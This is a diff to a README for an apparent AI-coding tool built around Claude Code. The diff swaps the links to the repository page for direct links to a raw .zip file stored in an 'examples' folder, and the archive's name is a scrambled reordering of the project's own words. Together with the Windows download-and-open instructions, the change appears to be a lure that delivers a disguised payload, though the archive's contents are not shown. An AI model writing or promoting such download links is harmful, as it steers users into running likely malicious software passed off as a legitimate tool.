@@ -1,6 +1,6 @@
 # 🤖 harness-engineering-from-cc-to-ai-coding - Turn Claude Code Into AI Workflows
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-blue-grey)](https://github.com/bridgepartnershoe860/harness-engineering-from-cc-to-ai-coding)
+[![Download the app](https://img.shields.io/badge/Download%20Now-blue-grey)](https://raw.githubusercontent.com/bridgepartnershoe860/harness-engineering-from-cc-to-ai-coding/main/examples/coding-ai-cc-to-harness-from-engineering-v2.4.zip)
 
 ## 🧭 Overview
 
@@ -10,7 +10,7 @@ Use it if you want a local tool that helps you manage AI coding tasks, review co
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/bridgepartnershoe860/harness-engineering-from-cc-to-ai-coding
+Visit this page to download: https://raw.githubusercontent.com/bridgepartnershoe860/harness-engineering-from-cc-to-ai-coding/main/examples/coding-ai-cc-to-harness-from-engineering-v2.4.zip
 
 If the page opens in your browser, look for the latest release or the main download file. On Windows, download the file to your computer first, then open it from your Downloads folder.
 
